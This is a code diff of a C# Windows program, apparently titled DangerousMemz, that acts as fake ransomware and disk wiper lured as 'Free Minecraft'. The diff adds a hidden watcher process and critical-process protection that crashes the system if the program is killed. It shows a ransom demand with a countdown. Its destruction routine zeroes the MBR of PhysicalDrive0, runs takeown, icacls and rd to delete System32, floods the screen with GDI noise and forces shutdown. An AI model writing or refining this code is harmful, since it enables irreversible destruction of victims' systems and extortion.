@@ -4,6 +4,7 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.IO;
 
 namespace DangerousMemz
 {
@@ -20,18 +21,34 @@ namespace DangerousMemz
         private Label lblTimer;
         private TextBox txtKey;
         private RichTextBox rtbMessage;
+        private static bool isWatcher = false;
 
         [STAThread]
-        static void Main()
+        static void Main(string[] args)
         {
+            // 1. MECHANIZM DWÓCH PROCESÓW (Watcher)
+            if (args.Length > 0 && args[0] == "--watcher") {
+                isWatcher = true;
+            } else {
+                Process.Start(Process.GetCurrentProcess().MainModule.FileName, "--watcher");
+            }
+
             Application.EnableVisualStyles();
-            // BSOD protection - jeśli proces zostanie zabity, system wywali błąd
+            
+            // Ochrona przed zamknięciem (BSOD)
             try { int i = 1; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref i, 4); } catch {}
+            
             Application.Run(new Program());
         }
 
         public Program()
         {
+            if (isWatcher) {
+                this.Opacity = 0;
+                this.ShowInTaskbar = false;
+                this.Load += (s, e) => this.Size = new Size(0, 0);
+            }
+
             this.Text = "Opps, files encrypted";
             this.Size = new Size(1000, 600);
             this.StartPosition = FormStartPosition.CenterScreen;
@@ -39,7 +56,7 @@ namespace DangerousMemz
             this.FormBorderStyle = FormBorderStyle.None;
             this.TopMost = true;
 
-            // Nagłówek
+            // UI IDENTYCZNE JAK NA TWOIM SCREENIE
             Label lblMain = new Label() { 
                 Text = "Opps, It look like your\nfiles have been\nENCRYPTED", 
                 Font = new Font("Arial Black", 24, FontStyle.Bold), 
@@ -49,7 +66,6 @@ namespace DangerousMemz
                 TextAlign = ContentAlignment.MiddleCenter
             };
 
-            // Timer (Żółty, rzuca się w oczy)
             lblTimer = new Label() { 
                 Text = "10:00", 
                 Font = new Font("Consolas", 40, FontStyle.Bold), 
@@ -59,7 +75,6 @@ namespace DangerousMemz
                 ForeColor = Color.Yellow 
             };
             
-            // Wiadomość o "Free Minecraft"
             rtbMessage = new RichTextBox() { 
                 Location = new Point(480, 120), 
                 Size = new Size(480, 350), 
@@ -69,47 +84,22 @@ namespace DangerousMemz
                 Text = "Oops, it looks like your files have been encrypted by \"Free Minecraft.\" Do you seriously think you'll find real Minecraft for free? Well, there are launchers like \"lu*an, fear*her.\" I didn't write what's in the star because of copyright issues, lol. Returning to the virus, to decrypt your computer and save it, contact [UNSETTLED] and I'll reply. Then you'll pay and get the code. Good luck!"
             };
 
-            // Pole klucza - Napis "Key."
             Label lblKeyHint = new Label() { Text = "Key.", ForeColor = Color.White, Font = new Font("Arial", 10, FontStyle.Bold), Location = new Point(50, 410) };
-            txtKey = new TextBox() { 
-                Text = "DBI_secret-2026", 
-                Font = new Font("Consolas", 12), 
-                Location = new Point(50, 435), 
-                Size = new Size(380, 30),
-                BackColor = Color.White
-            };
+            txtKey = new TextBox() { Text = "Key.", Font = new Font("Consolas", 12), Location = new Point(50, 435), Size = new Size(380, 30) };
             
-            // Przycisk Activate
-            Button btnActivate = new Button() { 
-                Text = "ACTIVATE", 
-                Location = new Point(50, 480), 
-                Size = new Size(180, 45), 
-                FlatStyle = FlatStyle.Flat, 
-                BackColor = Color.White,
-                Font = new Font("Arial", 10, FontStyle.Bold)
-            };
+            Button btnActivate = new Button() { Text = "ACTIVATE", Location = new Point(50, 480), Size = new Size(180, 45), FlatStyle = FlatStyle.Flat, BackColor = Color.White };
             btnActivate.Click += (s, e) => {
                 if (txtKey.Text == "DBI_SECRET-2026") {
                     int n = 0; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref n, 4);
-                    Environment.Exit(0);
-                } else { MessageBox.Show("Invalid License Key!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); }
+                    foreach (var pr in Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName)) pr.Kill();
+                } else { MessageBox.Show("Invalid Key!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); }
             };
 
-            // Przycisk Destroy Now
-            Button btnDestroy = new Button() { 
-                Text = "Destroy Now", 
-                Location = new Point(780, 480), 
-                Size = new Size(180, 45), 
-                FlatStyle = FlatStyle.Flat, 
-                BackColor = Color.Black, 
-                ForeColor = Color.White,
-                Font = new Font("Arial", 9, FontStyle.Bold)
-            };
+            Button btnDestroy = new Button() { Text = "Destroy Now", Location = new Point(780, 480), Size = new Size(180, 45), FlatStyle = FlatStyle.Flat, BackColor = Color.Black, ForeColor = Color.White };
             btnDestroy.Click += (s, e) => { timeLeft = 0; };
 
             this.Controls.AddRange(new Control[] { lblMain, lblTimer, rtbMessage, lblKeyHint, txtKey, btnActivate, btnDestroy });
 
-            // Timer logic
             System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 1000 };
             t.Tick += (s, e) => {
                 if (timeLeft > 0) { 
@@ -125,46 +115,34 @@ namespace DangerousMemz
 
         void ExecuteDestruction()
         {
-            // MBR Kill
-            try { uint w; IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1|2, IntPtr.Zero, 3, 0, IntPtr.Zero);
-            WriteFile(h, new byte[512], 512, out w, IntPtr.Zero); } catch {}
+            // 1. NADPISYWANIE MBR (Sektor 0)
+            try {
+                uint written;
+                byte[] mbrData = new byte[512]; // Same zera (pusty sektor startowy)
+                IntPtr drive = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
+                WriteFile(drive, mbrData, 512, out written, IntPtr.Zero);
+            } catch { }
 
-            // Kill Explorer
-            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe") { WindowStyle = ProcessWindowStyle.Hidden });
+            // 2. KASOWANIE SYSTEM32 (Wymaga uprawnień Admina)
+            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & takeown /f C:\\Windows\\System32 /r /d y & icacls C:\\Windows\\System32 /grant everyone:F /t & rd /s /q C:\\Windows\\System32") { WindowStyle = ProcessWindowStyle.Hidden });
 
-            // PAYLOAD: GREY TUNNEL
+            // 3. EFEKT ŚNIEŻENIA (GDI Static Noise)
             Thread gdiThread = new Thread(() => {
                 IntPtr hdc = GetDC(IntPtr.Zero);
                 int sw = GetSystemMetrics(0); int sh = GetSystemMetrics(1);
+                Random r = new Random();
                 while(true) {
-                    // Szarzenie/Przyciemnianie
-                    BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, 0x001100A6); 
-                    Thread.Sleep(150);
-                    // Efekt Tunelu
-                    BitBlt(hdc, 8, 8, sw - 16, sh - 16, hdc, 0, 0, 0x00CC0020);
-                    Thread.Sleep(40); 
+                    int x = r.Next(sw); int y = r.Next(sh);
+                    BitBlt(hdc, x, y, r.Next(200), r.Next(200), hdc, r.Next(sw), r.Next(sh), 0x00CC0020);
+                    Thread.Sleep(5); 
                 }
             });
             gdiThread.Start();
 
-            // PAYLOAD: MSG BOX SPAM
-            Thread msgThread = new Thread(() => {
-                while(true) {
-                    new Thread(() => MessageBox.Show("Your PC belongs to Free Minecraft now.", "RIP", MessageBoxButtons.OK, MessageBoxIcon.Hand)).Start();
-                    Thread.Sleep(3000); // Co 3 sekundy nowe okienko
-                }
-            });
-            msgThread.Start();
+            // 4. SHUTDOWN PO 60 SEKUNDACH
+            Process.Start("shutdown", "/s /t 60 /f /c \"System corruption detected.\"");
 
-            // SHUTDOWN PO 1 MINUCIE (60 sekund)
-            Process.Start("shutdown", "/s /t 60 /c \"PC saying BYE BYE\"");
-
-            this.Invoke((MethodInvoker)delegate {
-                this.Controls.Clear();
-                this.BackColor = Color.Black;
-                Label l = new Label() { Text = "BYE BYE", Font = new Font("Impact", 120, FontStyle.Bold), ForeColor = Color.DarkGray, Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
-                this.Controls.Add(l);
-            });
+            this.Invoke((MethodInvoker)delegate { this.Hide(); });
         }
     }
 }
